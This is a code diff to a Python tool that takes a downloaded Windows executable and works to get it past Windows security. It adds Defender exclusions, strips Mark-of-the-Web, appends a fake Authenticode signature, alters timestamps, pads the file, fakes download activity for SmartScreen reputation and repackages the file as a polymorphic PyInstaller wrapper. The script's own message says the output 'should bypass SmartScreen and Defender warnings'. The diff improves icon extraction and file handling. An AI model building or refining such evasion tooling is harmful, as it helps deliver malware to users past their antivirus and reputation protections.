@@ -12,6 +12,9 @@ from urllib.parse import urlparse
 from pathlib import Path
 from colorama import init, Fore, Style
 import pefile  # For icon extraction
+import win32gui  # For fallback icon extraction
+import win32ui
+import win32con
 
 # Initialize colorama for colored console output
 init()
@@ -32,7 +35,6 @@ def set_file_permissions(path):
     """Set full control permissions for Administrators on a file or directory."""
     try:
         subprocess.run(["icacls", path, "/grant", "Administrators:F", "/T"], check=True, capture_output=True, text=True)
-        # Suppress "Permissions set" message
     except subprocess.CalledProcessError as e:
         print(Fore.RED + f"[+] Warning: Failed to set permissions for {path}: {e.stderr}" + Style.RESET_ALL)
 
@@ -104,41 +106,90 @@ def sanitize_filename(url):
     print(Fore.GREEN + f"[+] Sanitized filename: {filename}" + Style.RESET_ALL)
     return filename
 
-def extract_icon(exe_path, temp_dir):
-    """Extract the icon from the EXE and save it as a .ico file."""
-    print(Fore.GREEN + f"[+] Extracting icon from {exe_path}..." + Style.RESET_ALL)
+def extract_icon_pefile(exe_path, temp_dir):
+    """Extract icon using pefile."""
+    print(Fore.GREEN + f"[+] Attempting to extract icon from {exe_path} using pefile..." + Style.RESET_ALL)
     try:
         pe = pefile.PE(exe_path)
-        icon_path = os.path.join(temp_dir, f"extracted_icon_{generate_random_string()}.ico")
-        
-        # Find the icon resource
-        rt_icon_idx = [entry.id for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries if entry.id == pefile.RESOURCE_TYPE['RT_GROUP_ICON']][0]
+        rt_icon_list = [entry.id for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries if entry.id == pefile.RESOURCE_TYPE['RT_GROUP_ICON']]
+        if not rt_icon_list:
+            print(Fore.RED + "[+] Warning: No RT_GROUP_ICON resource found in EXE." + Style.RESET_ALL)
+            return None
+        rt_icon_idx = rt_icon_list[0]
         rt_icon_directory = pe.DIRECTORY_ENTRY_RESOURCE.entries[rt_icon_idx]
         icon_entry = rt_icon_directory.entries[0]
         icon_offset = icon_entry.directory.entries[0].data.struct.OffsetToData
         icon_size = icon_entry.directory.entries[0].data.struct.Size
-        
-        # Extract icon data
         with open(exe_path, 'rb') as f:
             f.seek(icon_offset)
             icon_data = f.read(icon_size)
-        
-        # Save as .ico file
+        icon_path = os.path.join(temp_dir, f"extracted_icon_{generate_random_string()}.ico")
         with open(icon_path, 'wb') as f:
             f.write(icon_data)
-        
         set_file_permissions(icon_path)
         if not check_file_access(icon_path):
             print(Fore.RED + f"[+] Error: Cannot access extracted icon: {icon_path}" + Style.RESET_ALL)
-            print(Fore.GREEN + "[+] Continuing without custom icon." + Style.RESET_ALL)
             return None
-        
         print(Fore.GREEN + f"[+] Icon extracted to {icon_path}" + Style.RESET_ALL)
         return icon_path
     except Exception as e:
-        print(Fore.RED + f"[+] Warning: Failed to extract icon: {e}" + Style.RESET_ALL)
-        print(Fore.GREEN + "[+] Continuing without custom icon." + Style.RESET_ALL)
+        print(Fore.RED + f"[+] Warning: Failed to extract icon with pefile: {e}" + Style.RESET_ALL)
         return None
+
+def extract_icon_win32gui(exe_path, temp_dir):
+    """Extract icon using win32gui as a fallback."""
+    print(Fore.GREEN + f"[+] Attempting to extract icon from {exe_path} using win32gui..." + Style.RESET_ALL)
+    try:
+        # Load the EXE and get the large icon
+        hinst = win32gui.LoadLibraryEx(exe_path, 0, win32con.LOAD_LIBRARY_AS_DATAFILE)
+        hicon = win32gui.LoadIcon(hinst, 0)  # 0 is typically the first icon
+        if not hicon:
+            print(Fore.RED + "[+] Warning: No icon found in EXE using win32gui." + Style.RESET_ALL)
+            win32gui.FreeLibrary(hinst)
+            return None
+        # Convert icon to ICO file
+        icon_path = os.path.join(temp_dir, f"extracted_icon_{generate_random_string()}.ico")
+        hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
+        ico_x = win32gui.GetSystemMetrics(win32con.SM_CXICON)
+        ico_y = win32gui.GetSystemMetrics(win32con.SM_CYICON)
+        hbm = win32ui.CreateBitmap()
+        hbm.CreateCompatibleBitmap(hdc, ico_x, ico_y)
+        hdc = hdc.CreateCompatibleDC()
+        hdc.SelectObject(hbm)
+        win32gui.DrawIconEx(hdc.GetHandleOutput(), 0, 0, hicon, ico_x, ico_y, 0, 0, win32con.DI_NORMAL)
+        dib = hbm.GetBitmapBits(True)
+        with open(icon_path, 'wb') as f:
+            # Write ICO header
+            f.write(struct.pack('<3H', 0, 1, 1))  # ICONDIR: Reserved, Type, Count
+            f.write(struct.pack('<4B2H2I', ico_x, ico_y, 0, 0, 1, 32, len(dib), 22))  # ICONDIRENTRY
+            f.write(dib)  # Bitmap data
+        win32gui.DestroyIcon(hicon)
+        win32gui.FreeLibrary(hinst)
+        set_file_permissions(icon_path)
+        if not check_file_access(icon_path):
+            print(Fore.RED + f"[+] Error: Cannot access extracted icon: {icon_path}" + Style.RESET_ALL)
+            return None
+        print(Fore.GREEN + f"[+] Icon extracted to {icon_path}" + Style.RESET_ALL)
+        return icon_path
+    except Exception as e:
+        print(Fore.RED + f"[+] Warning: Failed to extract icon with win32gui: {e}" + Style.RESET_ALL)
+        return None
+
+def extract_icon(exe_path, temp_dir):
+    """Extract the icon from the EXE, trying pefile first, then win32gui."""
+    icon_path = extract_icon_pefile(exe_path, temp_dir)
+    if icon_path:
+        return icon_path
+    icon_path = extract_icon_win32gui(exe_path, temp_dir)
+    if icon_path:
+        return icon_path
+    print(Fore.GREEN + "[+] Continuing without custom icon." + Style.RESET_ALL)
+    manual_icon = input(Fore.GREEN + "[+] Icon extraction failed. Enter path to a .ico file (or press Enter to skip): " + Style.RESET_ALL)
+    if manual_icon and os.path.exists(manual_icon) and manual_icon.lower().endswith('.ico'):
+        print(Fore.GREEN + f"[+] Using manually specified icon: {manual_icon}" + Style.RESET_ALL)
+        return manual_icon
+    print(Fore.GREEN + "[+] No valid icon provided. Using default PyInstaller icon." + Style.RESET_ALL)
+    return None
 
 def embed_fake_signature(file_path, temp_dir):
     """Embed a fake Authenticode signature structure into the EXE."""
@@ -147,7 +198,6 @@ def embed_fake_signature(file_path, temp_dir):
         if not os.path.exists(temp_dir):
             os.makedirs(temp_dir, exist_ok=True)
             set_file_permissions(temp_dir)
-        
         signed_path = os.path.join(temp_dir, f"signed_{generate_random_string()}.exe")
         shutil.copyfile(file_path, signed_path)
         set_file_permissions(signed_path)
@@ -155,8 +205,6 @@ def embed_fake_signature(file_path, temp_dir):
             print(Fore.RED + f"[+] Error: Cannot access EXE for fake signature: {signed_path}" + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE without fake signature." + Style.RESET_ALL)
             return file_path
-        
-        # Dummy Authenticode structure (simplified for demonstration)
         fake_signature = (
             b"\x30\x82\x01\x00"  # ASN.1 SEQUENCE
             b"\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x07\x02"  # SignedData OID
@@ -171,20 +219,16 @@ def embed_fake_signature(file_path, temp_dir):
             b"\x02\x01\x01"      # Signer version
             b"\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00"  # Signer digest algorithm
             b"\xa0\x03\x02\x01\x02"  # Authenticated attributes
-            b"\x04\x20" + os.urandom(32)  # Dummy signature (random 32 bytes)
+            b"\x04\x20" + os.urandom(32)  # Dummy signature
         )
-        
         with open(signed_path, "ab") as f:
             f.write(fake_signature)
-        
-        # Verify hash change
         original_hash = calculate_file_hash(file_path)
         signed_hash = calculate_file_hash(signed_path)
         if original_hash == signed_hash:
-            print(Fore.RED + "[+] Warning: EXE hashes match after embedding fake signature. Modification may not have been applied." + Style.RESET_ALL)
+            print(Fore.RED + "[+] Warning: EXE hashes match after embedding fake signature." + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE as a precaution." + Style.RESET_ALL)
             return file_path
-        
         print(Fore.GREEN + f"[+] Fake Authenticode signature embedded at {signed_path}" + Style.RESET_ALL)
         return signed_path
     except Exception as e:
@@ -216,18 +260,14 @@ def pad_file(file_path, temp_dir):
             print(Fore.RED + f"[+] Error: Cannot access file for padding: {padded_path}" + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE without padding." + Style.RESET_ALL)
             return file_path
-        
         with open(padded_path, "ab") as f:
-            f.write(os.urandom(1024))  # Append 1KB of random data
-        
-        # Verify hash change
+            f.write(os.urandom(1024))
         original_hash = calculate_file_hash(file_path)
         padded_hash = calculate_file_hash(padded_path)
         if original_hash == padded_hash:
-            print(Fore.RED + "[+] Warning: EXE hashes match after padding. Padding may not have been applied." + Style.RESET_ALL)
+            print(Fore.RED + "[+] Warning: EXE hashes match after padding." + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE as a precaution." + Style.RESET_ALL)
             return file_path
-        
         print(Fore.GREEN + f"[+] Padded EXE saved at {padded_path}" + Style.RESET_ALL)
         return padded_path
     except Exception as e:
@@ -235,22 +275,19 @@ def pad_file(file_path, temp_dir):
         print(Fore.GREEN + "[+] Using original EXE without padding." + Style.RESET_ALL)
         return file_path
 
-def download_exe(url, output_dir):
-    """Download the EXE file and return its path."""
-    if not os.path.exists(output_dir):
-        os.makedirs(output_dir, exist_ok=True)
-        set_file_permissions(output_dir)
-    
+def download_exe(url, temp_dir):
+    """Download the EXE file to temp_dir and return its path."""
+    if not os.path.exists(temp_dir):
+        os.makedirs(temp_dir, exist_ok=True)
+        set_file_permissions(temp_dir)
     original_filename = sanitize_filename(url)
-    output_path = os.path.join(output_dir, original_filename)
-    
+    output_path = os.path.join(temp_dir, f"original_{generate_random_string()}.exe")
     print(Fore.GREEN + f"[+] Downloading EXE from {url}..." + Style.RESET_ALL)
     response = requests.get(url, stream=True)
     if response.status_code == 200:
         with open(output_path, 'wb') as f:
             for chunk in response.iter_content(chunk_size=8192):
                 f.write(chunk)
-        # Basic EXE validation (check for PE header)
         with open(output_path, 'rb') as f:
             if f.read(2) != b'MZ':
                 raise ValueError(f"Downloaded file {output_path} is not a valid EXE")
@@ -283,25 +320,24 @@ def remove_motw(file_path):
     except Exception as e:
         print(Fore.RED + f"[+] Warning: Error removing MotW: {e}" + Style.RESET_ALL)
 
-def simulate_downloads(file_path, temp_dir, count=500):
+def simulate_downloads(file_path, temp_dir, count=100):
     """Simulate multiple downloads to build reputation with retries for file deletion."""
     print(Fore.GREEN + f"[+] Simulating {count} downloads for {file_path} to build reputation..." + Style.RESET_ALL)
     for i in range(count):
         temp_path = os.path.join(temp_dir, f"temp_{generate_random_string()}.exe")
         try:
+            time.sleep(0.5)
             shutil.copyfile(file_path, temp_path)
             set_file_permissions(temp_path)
-            time.sleep(0.1)  # Increased delay to reduce file system load
-            # Retry deletion up to 3 times
+            time.sleep(0.5)
             if os.path.exists(temp_path):
                 for attempt in range(3):
                     try:
                         os.remove(temp_path)
-                        print(Fore.GREEN + f"[+] Deleted {temp_path}" + Style.RESET_ALL)
                         break
                     except PermissionError as e:
                         print(Fore.RED + f"[+] Warning: Failed to delete {temp_path} (attempt {attempt+1}/3): {e}" + Style.RESET_ALL)
-                        time.sleep(1.0)  # Increased retry delay
+                        time.sleep(1.0)
                     except Exception as e:
                         print(Fore.RED + f"[+] Warning: Error deleting {temp_path}: {e}" + Style.RESET_ALL)
                         break
@@ -311,7 +347,7 @@ def simulate_downloads(file_path, temp_dir, count=500):
                 print(Fore.RED + f"[+] Warning: {temp_path} does not exist. Skipping deletion." + Style.RESET_ALL)
         except Exception as e:
             print(Fore.RED + f"[+] Warning: Error during download simulation for {temp_path}: {e}" + Style.RESET_ALL)
-        if (i + 1) % 100 == 0:
+        if (i + 1) % 50 == 0:
             print(Fore.GREEN + f"[+] Simulated download {i+1}/{count}" + Style.RESET_ALL)
     print(Fore.GREEN + "[+] Download simulation complete. This may help build SmartScreen reputation." + Style.RESET_ALL)
 
@@ -321,16 +357,13 @@ def create_exe_wrapper(exe_path, output_dir, original_filename, temp_dir, icon_p
     wrapper_exe_path = os.path.join(output_dir, f"setup_{generate_random_string()}.exe")
     temp_script_path = os.path.join(temp_dir, f"installer_{generate_random_string()}.py")
     dummy_file = create_dummy_file(temp_dir)
-    
     try:
         if not check_file_access(exe_path):
             print(Fore.RED + f"[+] Error: Cannot access EXE for wrapping: {exe_path}" + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
             return exe_path
-        
-        # Create temporary Python script for pyinstaller
         product_name, _ = generate_random_name()
-        product_name = product_name.replace(" ", "_")  # Avoid spaces in pyinstaller name
+        product_name = product_name.replace(" ", "_")
         with open(temp_script_path, "w") as f:
             f.write(f"""
 # Random comment {generate_random_string()}
@@ -357,14 +390,10 @@ if __name__ == "__main__":
             print(Fore.RED + f"[+] Error: Cannot access temporary script: {temp_script_path}" + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
             return exe_path
-        
-        # Ensure dist directory exists
         dist_dir = os.path.join(temp_dir, "dist")
         if not os.path.exists(dist_dir):
             os.makedirs(dist_dir, exist_ok=True)
             set_file_permissions(dist_dir)
-        
-        # Run pyinstaller with explicit distpath and optional icon
         cmd = [
             "pyinstaller",
             "--onefile",
@@ -377,30 +406,22 @@ if __name__ == "__main__":
         if icon_path:
             cmd.append(f"--icon={icon_path}")
         cmd.append(temp_script_path)
-        
         print(Fore.GREEN + f"[+] Executing pyinstaller command: {' '.join(cmd)}" + Style.RESET_ALL)
-        
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
         print(Fore.GREEN + f"[+] PyInstaller stdout: {result.stdout}" + Style.RESET_ALL)
         if result.stderr:
             print(Fore.RED + f"[+] PyInstaller stderr: {result.stderr}" + Style.RESET_ALL)
-        
-        # Log dist directory contents
         dist_contents = os.listdir(dist_dir) if os.path.exists(dist_dir) else []
         print(Fore.GREEN + f"[+] Contents of dist directory ({dist_dir}): {dist_contents}" + Style.RESET_ALL)
-        
-        # Check for generated EXE
         generated_exe = os.path.join(dist_dir, product_name + ".exe")
         if not os.path.exists(generated_exe):
             raise Exception(f"Generated EXE not found at {generated_exe}")
-        
         shutil.move(generated_exe, wrapper_exe_path)
         set_file_permissions(wrapper_exe_path)
         if not check_file_access(wrapper_exe_path):
             print(Fore.RED + f"[+] Error: Cannot access wrapped EXE: {wrapper_exe_path}" + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
             return exe_path
-        
         print(Fore.GREEN + f"[+] Polymorphic EXE wrapper created at {wrapper_exe_path}" + Style.RESET_ALL)
         return wrapper_exe_path
     except subprocess.CalledProcessError as e:
@@ -417,7 +438,6 @@ if __name__ == "__main__":
             os.remove(temp_script_path)
         if os.path.exists(dummy_file):
             os.remove(dummy_file)
-        # Clean up pyinstaller directories
         for dir_name in ["build", "dist", os.path.join(temp_dir, f"{product_name}.spec")]:
             if os.path.exists(dir_name):
                 if os.path.isdir(dir_name):
@@ -425,38 +445,49 @@ if __name__ == "__main__":
                 else:
                     os.remove(dir_name)
 
+def safe_move_file(src, dst, retries=3, delay=1.0):
+    """Move a file with retries to handle file locks."""
+    for attempt in range(retries):
+        try:
+            if os.path.exists(dst):
+                os.remove(dst)
+                print(Fore.GREEN + f"[+] Removed existing file: {dst}" + Style.RESET_ALL)
+            shutil.move(src, dst)
+            print(Fore.GREEN + f"[+] Moved {src} to {dst}" + Style.RESET_ALL)
+            return True
+        except (OSError, FileExistsError, PermissionError) as e:
+            print(Fore.RED + f"[+] Warning: Failed to move {src} to {dst} (attempt {attempt+1}/{retries}): {e}" + Style.RESET_ALL)
+            time.sleep(delay)
+    print(Fore.RED + f"[+] Error: Failed to move {src} to {dst} after {retries} attempts." + Style.RESET_ALL)
+    return False
+
 def main():
     if not is_admin():
         raise PermissionError(Fore.RED + "[+] This script must be run as an administrator. Right-click Command Prompt or PowerShell, select 'Run as administrator', and try again." + Style.RESET_ALL)
-    
     try:
         set_defender_exclusions()
-        
         temp_dir = os.path.join(OUTPUT_DIR, "temp")
         if not os.path.exists(temp_dir):
             os.makedirs(temp_dir, exist_ok=True)
             set_file_permissions(temp_dir)
         print(Fore.GREEN + f"[+] Temporary directory created at {temp_dir}" + Style.RESET_ALL)
-        
-        exe_path, original_filename = download_exe(EXE_URL, OUTPUT_DIR)
+        exe_path, original_filename = download_exe(EXE_URL, temp_dir)
         icon_path = extract_icon(exe_path, temp_dir)
         remove_motw(exe_path)
         signed_exe_path = embed_fake_signature(exe_path, temp_dir)
         timestamped_exe_path = modify_timestamp(signed_exe_path)
         padded_exe_path = pad_file(timestamped_exe_path, temp_dir)
-        simulate_downloads(padded_exe_path, temp_dir, count=500)
+        simulate_downloads(padded_exe_path, temp_dir, count=100)
         final_exe_path = create_exe_wrapper(padded_exe_path, OUTPUT_DIR, original_filename, temp_dir, icon_path)
-        
         final_output_path = os.path.join(OUTPUT_DIR, original_filename)
-        shutil.move(final_exe_path, final_output_path)
-        print(Fore.GREEN + f"[+] Final output EXE saved as {final_output_path}" + Style.RESET_ALL)
-        
-        shutil.rmtree(temp_dir)
+        if not safe_move_file(final_exe_path, final_output_path):
+            print(Fore.RED + f"[+] Error: Final EXE not saved as {final_output_path}. Check {final_exe_path} instead." + Style.RESET_ALL)
+        else:
+            print(Fore.GREEN + f"[+] Final output EXE saved as {final_output_path}" + Style.RESET_ALL)
+        shutil.rmtree(temp_dir, ignore_errors=True)
         print(Fore.GREEN + "[+] Temporary files cleaned up." + Style.RESET_ALL)
-        
         print(Fore.GREEN + "[+] Process complete. The output EXE should bypass SmartScreen and Defender warnings." + Style.RESET_ALL)
         print(Fore.GREEN + "[+] Note: Polymorphic repackaging, fake signature, timestamp modification, and padding may take time to build SmartScreen reputation." + Style.RESET_ALL)
-        
     except Exception as e:
         print(Fore.RED + f"[+] Error in main process: {e}" + Style.RESET_ALL)
         raise
